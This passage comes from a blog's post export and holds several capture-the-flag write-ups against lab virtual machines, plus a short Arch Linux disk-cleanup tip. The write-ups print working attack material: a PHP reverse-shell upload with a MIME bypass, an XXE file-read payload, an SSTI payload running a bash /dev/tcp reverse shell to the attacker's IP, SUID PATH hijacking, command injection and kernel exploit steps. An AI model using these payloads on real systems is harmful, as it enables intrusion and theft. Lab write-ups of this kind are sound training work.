&quot;root&quot;; $password &#x3D; &quot;H4u%QJ_H99&quot;; $database &#x3D; &quot;Users&quot;; ?&gt; We have the creds for the mysql MysqlBrowse the databasemysql -u root -h 192.168.0.29 -p H4u%QJ_H99 show databases; +--------------------+ | Database | +--------------------+ | information_schema | | Users | +--------------------+ SHOW TABLES; +-----------------+ | Tables_in_Users | +-----------------+ | users | +-----------------+ select * from users; +------+------------------+ | user | pass | +------+------------------+ | kent | Sld6WHVCSkpOeQ&#x3D;&#x3D; | | mike | U0lmZHNURW42SQ&#x3D;&#x3D; | | kane | aVN2NVltMkdSbw&#x3D;&#x3D; | +------+------------------+ Decode the hashWe can decode them, with a base64 decoder. echo &quot;Sld6WHVCSkpOeQ&#x3D;&#x3D;&quot; | base64 --decode JWzXuBJJNy kent | JWzXuBJJNymike | SIfdsTEn6Ikane | iSv5Ym2GRo Upload a revershellLet’s upload a revershell.Ok let’s upload an image ( ͡° ͜ʖ ͡°). cp phprc.php rc.jpg It’s not working, let’s see the code of upload.php. curl http:&#x2F;&#x2F;192.168.0.29&#x2F;\\?page\\&#x3D;php:&#x2F;&#x2F;filter&#x2F;read\\&#x3D;convert.base64-encode&#x2F;resource\\&#x3D;upload ... if($imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;gif&#39; &amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;jpeg&#39; &amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;jpg&#39;&amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;png&#39;) &#123; die(&#39;Error 002&#39;); ... I have the error 002 because of the mime verification, I need to bypass it.I have to add this code in my file. GIF89aP; [shell] After the upload I change the cookie, it was hard to find this solution.I send the request an now i have a shell. GET &#x2F; HTTP&#x2F;1.1 Host: 192.168.0.29 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;98.0.4758.102 Safari&#x2F;537.36 Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9 Referer: http:&#x2F;&#x2F;192.168.0.29&#x2F; Accept-Encoding: gzip, deflate Accept-Language: fr-FR,fr;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7 Cookie: lang&#x3D;..&#x2F;upload&#x2F;29e8ea4a462331c5af3754eb8dbd4328.gif Connection: close Connect as kanepython -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; su kane iSv5Ym2GRo In the home directory we have the file msgmike it’s an executable. -rwsr-sr-x 1 mike mike 5148 Mar 17 2016 msgmike So it will run as mike.let’s see what is inside: strings ms* &#x2F;lib&#x2F;ld-linux.so.2 libc.so.6 _IO_stdin_used setregid setreuid system __libc_start_main __gmon_start__ GLIBC_2.0 PTRh QVh[ [^_] cat &#x2F;home&#x2F;mike&#x2F;msg.txt ;*2$&quot;( GCC: (Debian 4.9.2-10) 4.9.2 GCC: (Debian 4.8.4-1) 4.8.4 .symtab .strtab .shstrtab .interp .note.ABI-tag .note.gnu.build-id ... As we can see it’s using the command cat.google: exploit binaries privesc suid.https://materials.rangeforce.com/tutorial/2019/11/07/Linux-PrivEsc-SUID-Bit/We are using cat and not whoami. echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; &#x2F;tmp&#x2F;cat chmod 777 &#x2F;tmp&#x2F;cat export PATH&#x3D;&#x2F;tmp:$PATH .&#x2F;msgmike id Output: uid&#x3D;1002(mike) gid&#x3D;1002(mike) groups&#x3D;1002(mike),1003(kane) Now let’s see what is in the home director.We have a similar programe called msg2root. strings msg2root &#x2F;bin&#x2F;echo %s &gt;&gt; &#x2F;root&#x2F;messages.txt The %s is like the $1 in bash, he need an argument.I will execute 2 cammmands, the first one is echo, the second one is /bin/sh. A; B # Run A and then B, regardless of success of A A &amp;&amp; B # Run B if and only if A succeeded A || B # Run B if and only if A failed A &amp; # Run A in background. I’m gonna use ; to execute the 2 commands. .&#x2F;msg2root sdf;&#x2F;bin&#x2F;sh id Output: uid&#x3D;1002(mike) gid&#x3D;1002(mike) euid&#x3D;0(root) egid&#x3D;0(root) groups&#x3D;0(root),1003(kane) I’m gonna display the flag.Cat is broken si I’m gonna use tail. tail &#x2F;root&#x2F;* Output: &#x3D;&#x3D;&gt; &#x2F;root&#x2F;flag.txt &lt;&#x3D;&#x3D; (__ _) this challenge. (__ _) (_ ___) (_ ___) ( _ __) Please send me your feedback or your writeup, I will love ( _ __) (__ _) reading it (__ _) (__ _) (__ _) (__ _) For sniferl4bs.com (__ _) ( _ __) claor@PwnLab.net - @Chronicoder ( _ __) (__ _) (__ _) (_ ___)-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-(_ ___) &#96;-._.-&#39; &#96;-._.-&#39; &#x3D;&#x3D;&gt; &#x2F;root&#x2F;messages.txt &lt;&#x3D;&#x3D;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF simple CTF","slug":"CTF_Simple_CTF","date":"2022-03-03T00:20:52.000Z","updated":"2022-09-27T07:49:10.994Z","comments":true,"path":"/post/CTF_Simple_CTF.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Simple_CTF.html","excerpt":"","text":"netdiscoversudo netdiscover 192.168.0.27 nmapnmap -sV 192.168.0.27 PORT STATE SERVICE VERSION 80&#x2F;tcp open http Apache httpd 2.4.7 ((Ubuntu)) Port 80http://192.168.0.27As we can see it’s running CuteNews v.2.0.3.Les’t see if I can exploit it. https://www.exploit-db.com/exploits/37474 # Exploit : Vuln : http:&#x2F;&#x2F;127.0.0.1&#x2F;cutenews&#x2F;index.php?mod&#x3D;main&amp;opt&#x3D;personal 1 - Sign up for New User 2 - Log In 3 - Go to Personal options http:&#x2F;&#x2F;www.target.com&#x2F;cutenews&#x2F;index.php?mod&#x3D;main&amp;opt&#x3D;personal 4 - Select Upload Avatar Example: Evil.jpg 5 - use tamper data &amp; Rename File Evil.jpg to Evil.php -----------------------------2847913122899\\r\\nContent-Disposition: form-data; name&#x3D;&quot;avatar_file&quot;; filename&#x3D;&quot;Evil.php&quot;\\r\\ 6 - Your Shell : http:&#x2F;&#x2F;127.0.0.1&#x2F;cutenews&#x2F;uploads&#x2F;avatar_Username_FileName.php Example: http:&#x2F;&#x2F;127.0.0.1&#x2F;cutenews&#x2F;uploads&#x2F;avatar_toxic_Evil.php I have to register first, I’m gonna use the name user1. Download the revershellhttps://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.phpYou have to change the IP address and the port.You have to put the IP address of your computer, I always use the port 4648.Save the file as rc.jpg. Tamper data exploitOpen burpsuit.Proxy -&gt; intercept -&gt; open browser:go to this page: http://192.168.0.27/index.php?mod=main&amp;opt=personalYou have to forward to send the Request.Now send the file rc.jpg in the form.Rename the file in rc.php.You can close burpsuit now. netcatYou have to listen with netcat. nc -nlvp 4648 Now you can open the revers-shell.Now I have a shell. CVE-2015-1328uname -a Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU&#x2F;Linux Let’s go.https://www.exploit-db.com/exploits/37292I download the exploit on his computer in /tmp. wget https:&#x2F;&#x2F;www.exploit-db.com&#x2F;download&#x2F;37292 -O exp.c Then use gcc: gcc exp.c -o ofs And run it. .&#x2F;ofs I’m root","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF hacker kid","slug":"CTF_hacker_kid","date":"2022-02-28T02:19:25.000Z","updated":"2022-09-27T07:49:10.911Z","comments":true,"path":"/post/CTF_hacker_kid.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_hacker_kid.html","excerpt":"","text":"netdiscover192.168.0.32 nmapnmap -Sv 192.168.0.32 -p- PORT STATE SERVICE VERSION 53&#x2F;tcp open domain ISC BIND 9.16.1 (Ubuntu Linux) 80&#x2F;tcp open http Apache httpd 2.4.41 ((Ubuntu)) 9999&#x2F;tcp open http Tornado httpd 6.1 Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Port 80web page gobustergobuster dir -t 100 -u http:&#x2F;&#x2F;192.168.0.32&#x2F; -w Documents&#x2F;wordlist&#x2F;directory-list-medium.txt &#x2F;css (Status: 301) [Size: 310] [--&gt; http:&#x2F;&#x2F;192.168.0.32&#x2F;css&#x2F;] &#x2F;javascript (Status: 301) [Size: 317] [--&gt; http:&#x2F;&#x2F;192.168.0.32&#x2F;javascript&#x2F;] &#x2F;images (Status: 301) [Size: 313] [--&gt; http:&#x2F;&#x2F;192.168.0.32&#x2F;images&#x2F;] &#x2F;server-status (Status: 403) [Size: 277] Nothing interesting. Port 9999http://192.168.0.32:9999/login?next=%2F gobustergobuster dir -t 100 -u http:&#x2F;&#x2F;192.168.0.32:9999&#x2F; -w Documents&#x2F;wordlist&#x2F;directory-list-medium.txt &#x2F;login (Status: 200) [Size: 452] &#x2F;logout (Status: 302) [Size: 0] [--&gt; &#x2F;] source codeI remove the hidden argument.I have something to do with the xsrf cookie but it’s too hard to find the right cookie to inject. Back to port 80TO DO: Use a GET parameter page_no to view pages. So I have to do something like this:http://192.168.0.32/index.php\\?page_no\\=1And it’s working: I will script something, I can do it with burpsuit too.I’m grabing the size of the page. i&#x3D;0 n&#x3D;3654 while true; do size&#x3D;$(curl -so &#x2F;dev&#x2F;null http:&#x2F;&#x2F;192.168.0.32&#x2F;index.php\\?page_no\\&#x3D;$i -w &#39;%&#123;size_download&#125;&#39;) echo &quot;$i: $size&quot; if [ $size !&#x3D; $n ]; then break fi ((i&#x3D;i+1)) done Output: ➜ hackerkid .&#x2F;c.sh 0: 3654 1: 3654 2: 3654 3: 3654 4: 3654 5: 3654 6: 3654 7: 3654 8: 3654 9: 3654 10: 3654 11: 3654 12: 3654 13: 3654 14: 3654 15: 3654 16: 3654 17: 3654 18: 3654 19: 3654 20: 3654 21: 3849 Page 21http://192.168.0.32/index.php\\?page_no\\=21 /etc/hostsI’m adding this line to my file. 192.168.0.32 hacker.blackhat.local blackhat.local digI have to use dig on the domain name. dig hackers.blackhat.local @192.168.0.32 ; &lt;&lt;&gt;&gt; DiG 9.18.0 &lt;&lt;&gt;&gt; hackers.blackhat.local @192.168.0.32 ;; global options: +cmd ;; Got answer: ;; WARNING: .local is reserved for Multicast DNS ;; You are currently testing what happens when an mDNS query is leaked to DNS ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NXDOMAIN, id: 17027 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: a2f3e2323bd5863f010000006212500721681d408206f9d6 (good) ;; QUESTION SECTION: ;hackers.blackhat.local. IN A ;; AUTHORITY SECTION: blackhat.local. 3600 IN SOA blackhat.local. hackerkid.blackhat.local. 1 10800 3600 604800 3600 ;; Query time: 3 msec ;; SERVER: 192.168.0.32#53(192.168.0.32) (UDP) ;; WHEN: Sun Feb 20 15:28:23 CET 2022 ;; MSG SIZE rcvd: 125 COOKIE: a2f3e2323bd5863f010000006212500721681d408206f9d6 (good)hackerkid.blackhat.local Now I have to add it to my hosts file. hackerkid.blackhat.local xxe exploitThe form is build with xml, so I can exploit it with a xxe exploit.https://infosecwriteups.com/exploiting-xml-external-entity-xxe-injection-vulnerability-f8c4094fef83You have to type this in the xml request, it will display nothing. &lt;!DOCTYPE root[&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> And then display it wih this: &amp;xxe; But you can’t put it anywhere, it have to replace the email content. Read the bashrcFist I tryed to download a file then execute it with php.And use curl -O on a revershell script but it’s not working too.https://cxyy4rle.blogspot.com/2019/10/reading-local-files-with-xxe-attacks.html I willl try this on the user saket, I saw him in the /etc/passwd. &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY > &lt;!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/home/saket/.bashrc\" >]> Now I have to decode it:https://www.base64decode.org/ #Setting Password for running python app username&#x3D;&quot;admin&quot; password&#x3D;&quot;Saket!#$%@!!&quot; Tornado serverI have to login to the website with there’s credentials.http://192.168.0.32:9999/login?next=%2FI’m using saket because it’s not working with admin, and this user is un the /etc/passwd file and in the password.I’m logged.There is nothing else on this page. Tell me your name buddy How can i get to know who are you ?? He want a name, and he is using the word get, I’m not the best in english but, I think this sentence could be “how can I know who you are?”So I have to get a name. SSTIhttps://support.clickmeter.com/hc/en-us/articles/211032666-URL-parameters-How-to-pass-it-to-the-destination-URL www.yoursite.com?myparam={id} Let’s try it: http://192.168.0.32:9999/?name={id} Can I do something with this? http://192.168.0.32:9999/?name=49 This is good, the name of what I’m doing is Server Side Template Injection (SSTI). Reversshell So I found a way to exec a command. http:&#x2F;&#x2F;192.168.0.32:9999&#x2F;?name&#x3D;&#123;%import%20os%&#125;&#123;&#123;os.popen(%22whoami%22).read()&#125;&#125; Good now I want to use a revershell. I’m gonnna use this one: bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.21&#x2F;4648 0&gt;&amp;1&quot; But when I’m trying to run it in my browser I have an error.I have to use burpsuit.With this tool I saw where was the problem, the &amp; was not in the payload, it was interpreted as an another command.I have to encode my request and then send it.https://www.urlencoder.org/ &#123;% import os %&#125;&#123;&#123;os.system(&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.21&#x2F;4648 0&gt;&amp;1&quot;&#39;)&#125;&#125; Output: %7B%25%20import%20os%20%25%7D%7B%7Bos.system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.21%2F4648%200%3E%261%22%27%29%7D%7D I have to listen first. nc -nlvp 4648 EnumerationCreate web serverOn my computer. python2.7 -m SimpleHTTPServer Download themwget http:&#x2F;&#x2F;192.168.0.21:8000&#x2F;lse.sh wget http:&#x2F;&#x2F;192.168.0.21:8000&#x2F;lin.py Nothing interesting Bash historyOnly this part is interesting. python2.7 inject.py 405 nc 127.0.0.1 5600 ps -eax|grep root ps -eaf|grep root python2.7 inject.py 735 nc 127.0.0.1 5600 So, in the first line he is using an injector on the PID 405.Then open netcat to listen.I think it was the wrong PID so he list them.He list the PID with root permisions.Then use the injector with the good PIDAnd he use the commands: ps -eax|grep root ps -eaf|grep root exploithttps://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc saket@ubuntu:~$ ps -eaf|grep root ps -eaf|grep apache root 1363 1 0 05:44 ? 00:00:00 &#x2F;usr&#x2F;sbin&#x2F;apache2 -k start The PID is 1363. python2 inject.py 1363 You can check the open port, it should be 5600. netstat -tnlp Then we can use netcat to listen on the port. nc 127.0.0.1 5600 Now you are root.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"How to gain some GiB on Arch Linux","slug":"How_to_gain_some_GiB_on_Arch_Linux","date":"2022-02-21T02:15:52.000Z","updated":"2022-09-27T07:49:11.141Z","comments":true,"path":"/post/How_to_gain_some_GiB_on_Arch_Linux.html","link":"","permalink":"https://peanutstick.github.io/post/How_to_gain_some_GiB_on_Arch_Linux.html","excerpt":"","text":"See remaining space➜ ~ df -h FS Size Used Free Used% mount dev 3,8G 0 3,8G 0% &#x2F;dev run 3,9G 1,4M 3,9G 1% &#x2F;run &#x2F;dev&#x2F;nvme0n1p2 39G 27G 11G 72% &#x2F; tmpfs 3,9G 11M 3,9G 1% &#x2F;dev&#x2F;shm tmpfs 3,9G 1,6M 3,9G 1% &#x2F;tmp &#x2F;dev&#x2F;nvme0n1p3 78G 42G 32G 58% &#x2F;home &#x2F;dev&#x2F;sda1 328G 179G 133G 58% &#x2F;hdd &#x2F;dev&#x2F;sda6 394G 306G 68G 82% &#x2F;home&#x2F;peanutstick&#x2F;games &#x2F;dev&#x2F;sda7 99G 42G 58G 42% &#x2F;iso tmpfs 783M 84K 783M 1% &#x2F;run&#x2F;user&#x2F;1000 Scan a filesystemInstall ncdu pacman -S ncdu Then use it.Place yourself in the file system you whant to scan. ➜ ~ pwd &#x2F;home&#x2F;peanutstick ➜ ~ sudo ncdu -x Remove a packagesudo pacman -Rsn &lt;Package name&gt; Remove pacman cache1O GiB is gone for the cashe To remove all uninstalled packages sudo pacman -Sc List 10 biggest package yayyay -Ps &#x3D;&#x3D;&gt; Yay version v11.1.0.r5.g19d42ae &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&gt; Nombre total de paquets installés :1560 &#x3D;&#x3D;&gt; Foreign installed packages: 63 &#x3D;&#x3D;&gt; Installation explicite des paquets : 328 &#x3D;&#x3D;&gt; Taille totale occupée par les paquets : 13.3 GiB &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&gt; Dix plus gros paquets : ghidra: 928.1 MiB burpsuite: 504.2 MiB wine-staging: 502.2 MiB rust: 496.6 MiB nvidia-utils: 437.6 MiB go: 432.3 MiB metasploit: 330.8 MiB dotnet-sdk-bin: 303.5 MiB noto-fonts-cjk: 297.8 MiB visual-studio-code-bin: 275.2 MiB &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; :: Interrogation de AUR... -&gt; Paquets AUR orphelins : agg -&gt; Paquets AUR marqués comme obsolètes : optimus-manager responder","categories":[{"name":"Tips","slug":"Tips","permalink":"https://peanutstick.github.io/categories/Tips/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Jordaninfosec","slug":"CTF_jordaninfosec","date":"2022-02-17T21:11:00.000Z","updated":"2022-09-27T07:49:09.604Z","comments":true,"path":"/post/CTF_jordaninfosec.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_jordaninfosec.html","excerpt":"","text":"netdiscovery192.168.0.30 nmapnmap -sV -p- 192.168.0.30 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel gobustergobuster dir -t 100 -u http:&#x2F;&#x2F;192.168.0.30&#x2F; -w Documents&#x2F;wordlist&#x2F;directory-list-medium.txt First flaghttp://192.168.0.30/flag/The 1st flag is : {8734509128730458630012095} gobuster on uploaded_filesgobuster dir -t 100 -u http://192.168.0.30/uploaded_files -w Documents/wordlist/directory-list-medium.txt robots.txthttp://192.168.0.30/robots.txt User-agent: *Disallow: /Disallow: /backupDisallow: /adminDisallow: /admin_areaDisallow: /r00tDisallow: /uploadsDisallow: /uploaded_filesDisallow: /flag flag192.168.0.30/admin_area/https://i.imgur.com/nJdZs9h.png username : admin password : 3v1l_H@ck3r The 2nd flag is : {7412574125871236547895214}It’s not realist… and too easy. Connect as admin to the web pagehttp://192.168.0.30/index.php Upload php revers shellhttps://github.com/pentestmonkey/php-reverse-shellI upload my revershell. 49 $ip = ‘192.168.0.21’; // CHANGE THIS 50 $port = 4648; // CHANGE THIS ncnc -nlvp 4648 open the filehttp://192.168.0.30/uploaded_files/php-reverse-shell.php I have a shellhttps://i.imgur.com/e71ZKtm.png Enumopen http serverin my script directory python2.7 -m SimpleHTTPServer Download themwget http:&#x2F;&#x2F;192.168.0.21:8000&#x2F;lin.py wget http:&#x2F;&#x2F;192.168.0.21:8000&#x2F;lse.sh wget http:&#x2F;&#x2F;192.168.0.21:8000&#x2F;pol.py lse.shhttps://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh sh lse.sh [*] sys050 Can root user log in via SSH?…………………………….. yes! /var/www/html/hint.txttry to find user technawi password to read the flag.txt file, you can find it in a hidden file ;) The 3rd flag is : {7645110034526579012345670} Find the hidden filefind &#x2F; -name &quot;.*&quot; 2&gt; &#x2F;dev&#x2F;null /home/technawi/.sudo_as_admin_successfulSo I can use sudo with the user technawi https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#files-containing-passwords grep --color&#x3D;auto -rnw &#39;&#x2F;etc&#39; -ie &quot;technawi&quot; --color&#x3D;always 2&gt; &#x2F;dev&#x2F;null &#x2F;etc&#x2F;subgid:3:technawi:165536:65536 &#x2F;etc&#x2F;mysql&#x2F;conf.d&#x2F;credentials.txt:3:username : technawi &#x2F;etc&#x2F;subuid:3:technawi:165536:65536 &#x2F;etc&#x2F;passwd:30:technawi:x:1000:1000:technawi,,,:&#x2F;home&#x2F;technawi:&#x2F;bin&#x2F;bash &#x2F;etc&#x2F;group:5:adm:x:4:syslog,technawi &#x2F;etc&#x2F;group:18:cdrom:x:24:technawi &#x2F;etc&#x2F;group:21:sudo:x:27:technawi &#x2F;etc&#x2F;group:23:dip:x:30:technawi &#x2F;etc&#x2F;group:35:plugdev:x:46:technawi &#x2F;etc&#x2F;group:49:lxd:x:110:technawi &#x2F;etc&#x2F;group:54:technawi:x:1000: &#x2F;etc&#x2F;group:55:lpadmin:x:115:technawi &#x2F;etc&#x2F;group:56:sambashare:x:116:technawi hehe cat &#x2F;etc&#x2F;mysql&#x2F;conf.d&#x2F;credentials.txt The 4th flag is : &#123;7845658974123568974185412&#125; username : technawi password : 3vilH@ksor sshssh technawi@192.168.0.30 3vilH@ksor sudosudo -l [sudo] password for technawi: Matching Defaults entries for technawi on Jordaninfosec-CTF01: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;bin User technawi may run the following commands on Jordaninfosec-CTF01: (ALL : ALL) ALL Ok sudo su root@Jordaninfosec-CTF01:&#x2F;home&#x2F;technawi# id uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) root@Jordaninfosec-CTF01:&#x2F;home&#x2F;technawi# whoami root root@Jordaninfosec-CTF01:&#x2F;home&#x2F;technawi# cd &#x2F;var&#x2F;www&#x2F;html root@Jordaninfosec-CTF01:&#x2F;var&#x2F;www&#x2F;html# cat flag.txt The 5th flag is : &#123;5473215946785213456975249&#125; Good job :) You find 5 flags and got their points and finish the first scenario.... It was too easy.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Deathnote","slug":"CTF_Deathnote","date":"2022-02-08T01:20:57.000Z","updated":"2022-09-27T07:49:10.941Z","comments":true,"path":"/post/CTF_Deathnote.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Deathnote.html","excerpt":"","text":"Netdiscoversudo netdiscover 192.168.0.27 nmapnmap -sV -p- 192.168.0.27 PORT STATE SERVICE VERSION 22&#x2F;tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80&#x2F;tcp open http Apache httpd 2.4.38 ((Debian)) Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel gobustergobuster dir -t 100 -u http:&#x2F;&#x2F;192.168.0.27 -w Documents&#x2F;wordlist&#x2F;directory-list-medium.txt &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2022&#x2F;02&#x2F;07 19:28:21 Starting gobuster in directory enumeration mode &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x2F;wordpress (Status: 301) [Size: 316] [--&gt; http:&#x2F;&#x2F;192.168.0.27&#x2F;wordpress&#x2F;] &#x2F;manual (Status: 301) [Size: 313] [--&gt; http:&#x2F;&#x2F;192.168.0.27&#x2F;manual&#x2F;] &#x2F;server-status (Status: 403) [Size: 277] gobuster dir -t 100 -u http:&#x2F;&#x2F;192.168.0.27&#x2F;wordpress -w Documents&#x2F;wordlist&#x2F;directory-list-medium.txt &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2022&#x2F;02&#x2F;07 19:30:38 Starting gobuster in directory enumeration mode &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x2F;wp-content (Status: 301) [Size: 327] [--&gt; http:&#x2F;&#x2F;192.168.0.27&#x2F;wordpress&#x2F;wp-content&#x2F;] &#x2F;wp-includes (Status: 301) [Size: 328] [--&gt; http:&#x2F;&#x2F;192.168.0.27&#x2F;wordpress&#x2F;wp-includes&#x2F;] &#x2F;wp-admin (Status: 301) [Size: 325] [--&gt; http:&#x2F;&#x2F;192.168.0.27&#x2F;wordpress&#x2F;wp-admin&#x2F;] /etc/hosts/etc/hosts 192.168.0.27 deathnote.vuln Now I can load the website. Hint in the source 